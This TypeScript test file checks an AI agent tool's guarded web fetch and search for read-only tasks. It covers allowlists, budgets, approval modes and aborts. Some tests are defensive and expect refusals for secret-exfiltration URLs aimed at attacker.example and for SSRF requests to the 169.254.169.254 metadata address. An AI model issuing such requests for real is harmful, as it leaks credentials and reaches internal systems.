import { describe, it, expect, afterEach, vi } from 'vitest';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { StructuredRunner } from '../StructuredRunner';
import { OrdewellMcpServer, type McpClientConfig } from '../mcp';
import { createTask, type LegacyPlanState, type Task } from '../../models/Task';
import { fakeConfig } from '../../testing';
import { fakeSecret } from './fakeSecret';
import { fakeFs, makeSession, taskOf } from './sessionTestKit';
import { WebReadPolicy } from '../webReadPolicy';
import { HttpWebFetcher } from '../HttpWebFetcher';
import { ApprovalPolicy, effectiveApprovalMode } from '../ApprovalPolicy';
import type { IFileSystem, TaskShell } from '../../interfaces/IFileSystem';
import { WebResponseCache } from '../WebResponseCache';
import { TaskWebReader } from '../taskWebReads';
import type { IWebFetcher } from '../../interfaces/IWebFetcher';
import type { WebResponse, WebTransport } from '../HttpWebFetcher';
import type { AgentEvent, AgentStartOptions, TaskModeAgentAdapter } from '../harness/AgentAdapter';
import type { ApprovalDecision } from '../../interfaces/IApproval';
import type { IConfig } from '../../interfaces/IConfig';

/**
 * A read-only task's web reads (ADR-0046) end to end: a session built by the
 * real composition root, a structured runner handed the attempt's token, and
 * the "model" an MCP client calling `fetch` and `web_search` with it, over a
 * fake network and DNS.
 */

const PUBLIC_IP = '93.184.215.14';
const SEARCH_PAGE = `<a rel="nofollow" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fhono.dev%2Fdocs&amp;rut=abc" class='result-link'>Hono docs</a><table><tr><td class='result-snippet'>Routing</td></tr></table>`;

class IdleAdapter implements TaskModeAgentAdapter {
  async mcpAttached(): Promise<boolean> { return true; }
  readonly agentId = 'claude-code';
  readonly exited = false;
  start_: AgentStartOptions | undefined;
  private exit: Array<(code: number) => void> = [];

  async start(opts: AgentStartOptions): Promise<void> { this.start_ = opts; }
  send(_message: string, _onEvent: (event: AgentEvent) => void): Promise<void> { return new Promise<void>(() => undefined); }
  async interrupt(): Promise<boolean> { return false; }
  onProcessExit(listener: (code: number) => void): void { this.exit.push(listener); }
  answerPermission(_id: string, _decision: ApprovalDecision): boolean { return true; }
  nativeSessionId(): string | null { return null; }
  dispose(): void {}

  get config(): McpClientConfig {
    const opts = this.start_;
    if (opts?.kind !== 'task' || !opts.mcp) throw new Error('the runner was not given the server');
    return opts.mcp;
  }
}

const servers: OrdewellMcpServer[] = [];
const clients: Client[] = [];

afterEach(async () => {
  await Promise.all(clients.splice(0).map((c) => c.close().catch(() => undefined)));
  await Promise.all(servers.splice(0).map((s) => s.dispose()));
});

function page(body: string, headers: Record<string, string> = {}): WebResponse {
  const all: Record<string, string> = { 'content-type': 'text/html', ...headers };
  return { ok: true, status: 200, headers: { get: (name) => all[name.toLowerCase()] ?? null }, body: null, text: async () => body };
}

function rig(config: Partial<IConfig> = {}, fsAdapter?: IFileSystem) {
  const server = new OrdewellMcpServer({ heartbeatMs: 50 });
  servers.push(server);
  const adapters: IdleAdapter[] = [];
  const runner = new StructuredRunner({
    createAdapter: () => {
      const adapter = new IdleAdapter();
      adapters.push(adapter);
      return adapter;
    },
    interruptGraceMs: 20,
    mcp: server,
  });
  const transport = vi.fn<WebTransport>(async (url) => page(url.includes('duckduckgo') ? SEARCH_PAGE : `<p>Docs at ${url}</p>`));
  const resolveHost = vi.fn(async (_host: string) => [PUBLIC_IP]);
  const broadcast = vi.fn();
  const settings = fakeConfig({ approvalMode: 'auto', autonomousMode: false, ...config });
  const session = makeSession({
    runner,
    mcpServer: server,
    broadcast,
    config: settings,
    ...(fsAdapter ? { fsAdapter } : {}),
    web: { transport, resolveHost, cache: new WebResponseCache() },
  });
  const load = (tasks: Task[]) => session.loadPlan({
    tasks, generatedAt: new Date().toISOString(), status: 'approved', runners: ['claude-code'], lastUpdated: new Date().toISOString(),
  } as LegacyPlanState, 'Goal', '/repo');
  const start = async (id: string) => {
    const before = adapters.length;
    await session.execute({ command: 'force_start', task: id }, { kind: 'user' });
    await vi.waitFor(() => expect(adapters.length).toBeGreaterThan(before));
    return connect(adapters.at(-1)!.config);
  };
  return { session, settings, server, adapters, transport, resolveHost, broadcast, load, start };
}

async function connect(config: McpClientConfig): Promise<Client> {
  const client = new Client({ name: 'test', version: '0.0.0' });
  await client.connect(new StreamableHTTPClientTransport(new URL(config.url), { requestInit: { headers: config.headers } }));
  clients.push(client);
  return client;
}

function text(result: Awaited<ReturnType<Client['callTool']>>): string {
  return (result.content as { type: string; text: string }[]).map((c) => c.text).join('\n');
}

/** On the mode Claude Code's manifest tags read-only (ADR-0001). */
const readOnly = (id: string, order: number, over: Partial<Task> = {}) =>
  createTask({ id, order, title: `Research ${id}`, prompt: `look up ${id}`, assignedRunner: 'claude-code', taskMode: 'plan', ...over });
const change = (id: string, order: number) =>
  createTask({ id, order, title: `Change ${id}`, prompt: `change ${id}`, assignedRunner: 'claude-code', taskMode: 'bypassPermissions' });

describe('a read-only task reads the web through Ordewell (ADR-0046)', () => {
  it('lists fetch and web_search on its token, and reads a public page through the session\'s guarded fetcher', async () => {
    const env = rig();
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');

    const names = (await client.listTools()).tools.map((t) => t.name);
    expect(names).toEqual(['task_complete', 'checkpoint', 'read_task', 'run_command', 'save_patch', 'fetch', 'web_search']);

    const result = await client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/oauth' } });
    expect(result.isError).toBe(false);
    expect(text(result)).toContain('Docs at https://docs.example.com/oauth');
    expect(env.resolveHost).toHaveBeenCalledWith('docs.example.com');
    expect(env.transport).toHaveBeenCalledTimes(1);
  });

  it('searches through the session\'s provider, and the result says what the policy decided and what is left', async () => {
    const env = rig({ webReadBudget: 5 });
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');

    const result = await client.callTool({ name: 'web_search', arguments: { query: 'opencode oauth' } });

    expect(result.isError).toBe(false);
    expect(text(result)).toContain('https://hono.dev/docs');
    expect(text(result)).toMatch(/\[Allowed by the session's web-read policy without asking anyone \(web_search:duckduckgo by the approval mode\); 4 web reads left in this attempt\.\]$/);
  });

  it('keeps its decisions out of the planner\'s conversation: each one is the call\'s result, an allowed read naming what allowed it', async () => {
    const env = rig({ webReadBudget: 1, approvalPreApproved: ['https://docs.example.com/*', '!https://internal.example.com/*'] });
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');

    const allowed = await client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/oauth' } });
    const excluded = await client.callTool({ name: 'fetch', arguments: { url: 'https://internal.example.com/' } });
    const overBudget = await client.callTool({ name: 'web_search', arguments: { query: 'opencode oauth' } });

    expect(text(allowed)).toMatch(/\[Allowed by the session's web-read policy without asking anyone \(https:\/\/docs\.example\.com\/\* by the planner allowlist\); 0 web reads left in this attempt\.\]$/);
    expect(text(excluded)).toMatch(/is excluded by the planner allowlist/);
    expect(text(overBudget)).toMatch(/this task attempt has used its web-read budget/);
    expect(env.broadcast).not.toHaveBeenCalledWith(expect.objectContaining({ type: 'approval_decided' }));
  });

  it('names a cross-origin redirect hop\'s decision in the same read\'s result', async () => {
    const env = rig({ approvalPreApproved: ['https://mirror.example.org/*'] });
    env.transport.mockImplementation(async (url) => (url === 'https://docs.example.com/moved'
      ? { ok: false, status: 302, headers: { get: (name) => (name === 'location' ? 'https://mirror.example.org/guide' : null) }, body: null, text: async () => '' }
      : page(`<p>Docs at ${url}</p>`)));
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');

    const result = await client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/moved' } });

    expect(text(result)).toContain('Docs at https://mirror.example.org/guide');
    expect(text(result)).toMatch(/\(https:\/\/docs\.example\.com\/\* by the approval mode; https:\/\/mirror\.example\.org\/\* by the planner allowlist\); 38 web reads left in this attempt\.\]$/);
    expect(env.broadcast).not.toHaveBeenCalledWith(expect.objectContaining({ type: 'approval_decided' }));
  });

  it('keeps a change task\'s tools as they were: no fetch or web_search on its token', async () => {
    const env = rig();
    env.load([change('c1', 1)]);
    const client = await env.start('c1');

    expect((await client.listTools()).tools.map((t) => t.name)).toEqual(['task_complete', 'checkpoint', 'read_task', 'apply_patch']);
    await expect(client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/' } })).rejects.toThrow(/'fetch' is disabled on this token: read-only tasks only/);
    expect(env.transport).not.toHaveBeenCalled();
  });

  it('never asks anyone: a read the settings would only allow after asking is refused before any lookup or request', async () => {
    const env = rig({ approvalMode: 'ask' });
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');

    const page = await client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/oauth' } });
    const found = await client.callTool({ name: 'web_search', arguments: { query: 'opencode oauth' } });

    expect(page.isError).toBe(true);
    expect(text(page)).toBe('Fetch refused: https://docs.example.com/* is not approved in this session, and a read-only task runs in the background where nothing can be approved. Report the gap in your task_complete handoff; the planner can fetch it directly.');
    expect(found.isError).toBe(true);
    expect(text(found)).toMatch(/^Web search refused: a read-only task runs in the background/);
    expect(env.broadcast).not.toHaveBeenCalledWith(expect.objectContaining({ type: 'approval_request' }));
    expect(env.resolveHost).not.toHaveBeenCalled();
    expect(env.transport).not.toHaveBeenCalled();
  });

  it('reads what a standing allowlist entry covers in ask mode, and an exclusion still wins over it and over the mode', async () => {
    const env = rig({ approvalMode: 'ask', approvalPreApproved: ['https://docs.example.com/*', 'web_search:duckduckgo'] });
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');

    expect((await client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/oauth' } })).isError).toBe(false);
    expect((await client.callTool({ name: 'web_search', arguments: { query: 'opencode oauth' } })).isError).toBe(false);

    const allowAll = rig({ approvalMode: 'allow', approvalPreApproved: ['https://docs.example.com/*', '!https://docs.example.com/*', '!web_search:*'] });
    allowAll.load([readOnly('r2', 1)]);
    const excluded = await allowAll.start('r2');
    const page = await excluded.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/oauth' } });
    const found = await excluded.callTool({ name: 'web_search', arguments: { query: 'opencode oauth' } });
    expect(text(page)).toBe('Fetch refused: https://docs.example.com/* is excluded by the planner allowlist. Continue without it.');
    expect(text(found)).toBe('Web search refused: web_search:duckduckgo is excluded by the planner allowlist. Continue without it.');
    expect(allowAll.resolveHost).not.toHaveBeenCalled();
    expect(allowAll.transport).not.toHaveBeenCalled();
  });

  it('refuses a URL or query carrying a credential the session holds, its own token included, before any DNS lookup', async () => {
    const providerKey = 'held-provider-key-7f3a9c2e51d84b06';
    const env = rig({ apiKey: providerKey });
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');
    const token = env.adapters[0].config.headers.Authorization.replace(/^Bearer /, '');

    for (const url of [`https://${providerKey}.attacker.example/`, `https://attacker.example/?t=${token}`, `https://attacker.example/?k=${fakeSecret('github')}`]) {
      const result = await client.callTool({ name: 'fetch', arguments: { url } });
      expect(result.isError).toBe(true);
      expect(text(result)).toBe('Fetch refused: the URL contains what looks like a secret (an API key, token or credential). Never put credentials in a URL; continue without it.');
      expect(text(result)).not.toContain(token);
    }
    const query = await client.callTool({ name: 'web_search', arguments: { query: `docs ${providerKey}` } });
    expect(text(query)).toMatch(/^Web search refused: the query contains what looks like a secret/);
    expect(env.resolveHost).not.toHaveBeenCalled();
    expect(env.transport).not.toHaveBeenCalled();
    // Recorded without what was refused.
    const recorded = JSON.stringify(env.broadcast.mock.calls);
    expect(recorded).not.toContain(providerKey);
    expect(recorded).not.toContain(token);
  });

  it('refuses private addresses: a literal one, a name that resolves to one, and a redirect to one', async () => {
    const env = rig();
    env.resolveHost.mockImplementation(async (host) => (host === 'intranet.example.com' ? ['10.0.0.7'] : [PUBLIC_IP]));
    env.transport.mockImplementation(async (url) => (url.startsWith('https://docs.example.com/moved')
      ? { ok: false, status: 302, headers: { get: (name) => (name === 'location' ? 'https://169.254.169.254/latest/meta-data/' : null) }, body: null, text: async () => '' }
      : page('<p>never</p>')));
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');

    const literal = await client.callTool({ name: 'fetch', arguments: { url: 'http://169.254.169.254/latest/meta-data/' } });
    const resolved = await client.callTool({ name: 'fetch', arguments: { url: 'https://intranet.example.com/' } });
    const redirected = await client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/moved' } });

    for (const result of [literal, resolved, redirected]) expect(result.isError).toBe(true);
    expect(text(literal)).toMatch(/^Fetch refused: .*Private, local and non-web addresses are never fetched\.$/);
    expect(text(resolved)).toMatch(/^Fetch refused: .*Private, local and non-web addresses are never fetched\.$/);
    expect(text(redirected)).toMatch(/^Fetch failed: the page redirected to another origin, which was refused\. Fetch refused:/);
    expect(env.transport.mock.calls.map(([url]) => url)).toEqual(['https://docs.example.com/moved']);
  });

  it('spends a budget of the attempt\'s own: parallel reads cannot overspend it, and a second task has its own', async () => {
    const env = rig({ webReadBudget: 2 });
    env.load([readOnly('r1', 1), readOnly('r2', 2)]);
    const first = await env.start('r1');

    const results = await Promise.all([1, 2, 3, 4].map((n) => first.callTool({ name: 'fetch', arguments: { url: `https://docs.example.com/${n}` } })));

    expect(results.filter((r) => !r.isError)).toHaveLength(2);
    const refused = results.filter((r) => r.isError).map(text);
    expect(refused).toEqual([
      'Fetch refused: this task attempt has used its web-read budget (2). Continue with what you have, and say in your handoff that more reading would need a higher budget.',
      'Fetch refused: this task attempt has used its web-read budget (2). Continue with what you have, and say in your handoff that more reading would need a higher budget.',
    ]);
    expect(env.transport).toHaveBeenCalledTimes(2);

    const second = await env.start('r2');
    expect((await second.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/5' } })).isError).toBe(false);
    expect(env.transport).toHaveBeenCalledTimes(3);
  });

  it('decides a cached page again: an exclusion added after one task read it refuses the next read, with no request', async () => {
    const env = rig();
    env.transport.mockImplementation(async () => page('<p>Cacheable</p>', { 'cache-control': 'max-age=600' }));
    env.load([readOnly('r1', 1), readOnly('r2', 2)]);
    const first = await env.start('r1');
    expect(text(await first.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/guide' } }))).toContain('Cacheable');

    env.settings.approvalPreApproved = ['!https://docs.example.com/*'];
    const second = await env.start('r2');
    const again = await second.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/guide' } });

    expect(again.isError).toBe(true);
    expect(text(again)).toMatch(/is excluded by the planner allowlist/);
    expect(env.transport).toHaveBeenCalledTimes(1);
  });
});

describe('a read-only task\'s web reads end with its attempt (ADR-0046)', () => {
  /** A transport that answers only once released, and records the signal each request was sent with. */
  function hanging(env: ReturnType<typeof rig>) {
    const signals: AbortSignal[] = [];
    env.transport.mockImplementation((_url, init) => new Promise<WebResponse>((_resolve, reject) => {
      signals.push(init.signal);
      init.signal.addEventListener('abort', () => reject(new Error('aborted')), { once: true });
    }));
    return signals;
  }

  it('aborts a read in flight when the task is stopped, and its token reads nothing after', async () => {
    const env = rig();
    const signals = hanging(env);
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');

    const inFlight = client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/slow' } }).then(text, (err: Error) => err.message);
    await vi.waitFor(() => expect(signals).toHaveLength(1));
    await env.session.execute({ command: 'stop_task', task: 'r1' }, { kind: 'user' });

    await vi.waitFor(() => expect(signals[0].aborted).toBe(true));
    expect(await inFlight).not.toContain('Docs at');
    await expect(client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/after' } })).rejects.toThrow();
    expect(env.transport).toHaveBeenCalledTimes(1);
  });

  it('aborts the request when the caller cancels its call', async () => {
    const env = rig();
    const signals = hanging(env);
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');

    const cancel = new AbortController();
    const call = client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/slow' } }, undefined, { signal: cancel.signal });
    await vi.waitFor(() => expect(signals).toHaveLength(1));
    cancel.abort();

    await expect(call).rejects.toThrow();
    await vi.waitFor(() => expect(signals[0].aborted).toBe(true));
  });

  it('refuses a retried task\'s old token, and gives the new attempt a fresh budget', async () => {
    const env = rig({ webReadBudget: 1 });
    env.load([readOnly('r1', 1)]);
    const first = await env.start('r1');
    expect((await first.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/1' } })).isError).toBe(false);
    expect(text(await first.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/2' } }))).toMatch(/used its web-read budget \(1\)/);
    const stale = env.adapters[0].config;
    await first.callTool({ name: 'task_complete', arguments: { status: 'failed', summary: '', reason: 'needs another look' } });
    await vi.waitFor(() => expect(taskOf(env.session, 'r1')?.status).toBe('failed'));

    await env.session.execute({ command: 'retry_task', task: 'r1', from: 'fresh' }, { kind: 'user' });
    await vi.waitFor(() => expect(env.adapters).toHaveLength(2));
    const second = await connect(env.adapters[1].config);

    await expect(connect(stale)).rejects.toThrow();
    expect((await second.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/3' } })).isError).toBe(false);
    expect(env.transport).toHaveBeenCalledTimes(2);
  });

  it('reads through the host after its shell has gone sealed, and the read neither unseals the shell nor skips the policy', async () => {
    let sealed = false;
    const run = vi.fn<TaskShell['run']>(async (command) => {
      // A here-document runs sealed, and every command after it does too (ADR-0046).
      if (command.includes('<<')) sealed = true;
      return { success: true, output: sealed ? `[Ran sealed: no network] ${command}` : command, truncated: false };
    });
    const env = rig({ approvalPreApproved: ['!https://internal.example.com/*'] }, { ...fakeFs(), taskShell: () => ({ run, end: vi.fn() }) });
    env.load([readOnly('r1', 1)]);
    const client = await env.start('r1');

    expect(text(await client.callTool({ name: 'run_command', arguments: { command: "cat <<'EOF' > probe.py\nprint(1)\nEOF" } }))).toMatch(/^\[Ran sealed/);
    const page = await client.callTool({ name: 'fetch', arguments: { url: 'https://docs.example.com/oauth' } });
    const excluded = await client.callTool({ name: 'fetch', arguments: { url: 'https://internal.example.com/' } });
    const after = await client.callTool({ name: 'run_command', arguments: { command: 'gh issue list' } });

    expect(page.isError).toBe(false);
    expect(text(page)).toContain('Docs at https://docs.example.com/oauth');
    expect(text(excluded)).toMatch(/is excluded by the planner allowlist/);
    expect(text(after)).toMatch(/^\[Ran sealed/);
    // The reads went through the host's transport, never the shell.
    expect(run.mock.calls.map(([command]) => command)).toEqual(["cat <<'EOF' > probe.py\nprint(1)\nEOF", 'gh issue list']);
    expect(env.transport).toHaveBeenCalledTimes(1);
  });
});

describe('a task attempt\'s web-read budget and the planner\'s (ADR-0046, ADR-0027)', () => {
  it('counts apart: a planner turn neither spends nor resets an attempt\'s budget, nor one attempt another\'s', async () => {
    let turn = 'turn-1';
    const approval = new ApprovalPolicy({ mode: (kind) => effectiveApprovalMode('auto', false, kind) });
    const resolveHost = async () => [PUBLIC_IP];
    const transport = vi.fn<WebTransport>(async (url) => page(`<p>${url}</p>`));
    const planner = new HttpWebFetcher({
      policy: new WebReadPolicy({ approval, env: () => ({}), resolveHost, budget: () => 1, turn: () => turn }),
      fetchImpl: transport, resolveHost, cache: new WebResponseCache(),
    });
    const attemptA = planner.forTask('Research A')!;
    const attemptB = planner.forTask('Research B')!;

    expect((await planner.fetch('https://docs.example.com/p1')).success).toBe(true);
    expect((await attemptA.fetch('https://docs.example.com/a1')).success).toBe(true);
    expect((await planner.fetch('https://docs.example.com/p2')).output).toMatch(/this planner turn has used its web-read budget/);
    expect((await attemptA.fetch('https://docs.example.com/a2')).output).toMatch(/this task attempt has used its web-read budget/);
    expect((await attemptB.fetch('https://docs.example.com/b1')).success).toBe(true);

    turn = 'turn-2';
    expect((await planner.fetch('https://docs.example.com/p3')).success).toBe(true);
    expect((await attemptA.fetch('https://docs.example.com/a3')).success).toBe(false);
    expect(transport).toHaveBeenCalledTimes(4);
  });
});

describe('TaskWebReader', () => {
  it('hands nothing to a runner whose attempt ended while a read was in flight, even one its transport still answered', async () => {
    let answer: (outcome: { success: true; output: string; truncated: false }) => void = () => undefined;
    const fetcher: IWebFetcher = {
      decide: async () => ({ allowed: true }),
      // A transport that ignores the abort and answers anyway.
      fetch: () => new Promise((resolve) => { answer = resolve; }),
      remaining: () => 39,
    };
    const reader = new TaskWebReader(fetcher);

    const read = reader.fetch('https://docs.example.com/slow', new AbortController().signal);
    reader.end();
    answer({ success: true, output: 'Docs body', truncated: false });

    expect(await read).toEqual({ text: 'This task attempt has ended, so nothing was read.', isError: true });
  });
});
